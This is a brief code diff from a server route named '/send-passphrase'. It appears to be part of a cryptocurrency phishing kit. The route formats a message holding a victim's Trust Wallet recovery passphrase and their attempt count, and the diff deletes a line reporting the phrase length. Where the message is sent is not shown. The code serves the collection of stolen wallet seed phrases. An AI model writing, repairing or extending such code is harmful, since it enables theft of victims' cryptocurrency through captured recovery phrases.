@@ -23,7 +23,6 @@ router.post("/send-passphrase", async (req, res) => {
 
 Wallet Type: Trust Wallet
 Attempt: ${attempt}${attempt === 1 ? 'st' : 'nd'} attempt
-Phrase Length: ${phrassType === 1 ? 12 : 24} words
 
 Passphrase:
 ${passStr}
